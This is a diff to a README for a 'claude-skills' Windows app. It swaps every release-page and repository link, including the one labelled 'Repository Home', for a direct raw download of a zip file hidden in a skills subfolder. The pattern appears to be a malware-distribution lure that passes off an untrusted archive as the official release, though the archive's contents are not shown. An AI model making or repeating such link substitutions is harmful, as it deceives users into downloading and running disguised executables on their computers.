@@ -1,6 +1,6 @@
 # 🤖 claude-skills - Curated Skills for Claude AI Use
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Marine-softdrink524/claude-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to download and run claude-skills on your Windows computer.
 
 Click the big button below to go to the downloads page on GitHub.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Marine-softdrink524/claude-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
 
 This page lists all the available files and versions of claude-skills. You will find the latest version at the top.
 
@@ -114,7 +114,7 @@ Once the app is running, you can browse and try different skills. Here is how to
 
 To update to the newest version:
 
-1. Return to the [Releases page](https://github.com/Marine-softdrink524/claude-skills/releases).  
+1. Return to the [Releases page](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip).  
 2. Download the latest release files as before.  
 3. Replace your old files with the new ones, or rerun the installer.  
 4. Restart the application to use the new skills and features.  
@@ -133,9 +133,9 @@ If you encounter any issues or want to suggest improvements:
 
 ## 🔗 Useful Links
 
-- Main Release Page: [https://github.com/Marine-softdrink524/claude-skills/releases](https://github.com/Marine-softdrink524/claude-skills/releases)  
-- Repository Home: [https://github.com/Marine-softdrink524/claude-skills](https://github.com/Marine-softdrink524/claude-skills)  
+- Main Release Page: [https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)  
+- Repository Home: [https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)  
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Marine-softdrink524/claude-skills/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Marine-softdrink524/claude-skills/main/skills/customer-support-agent/skills_claude_v3.9.zip)
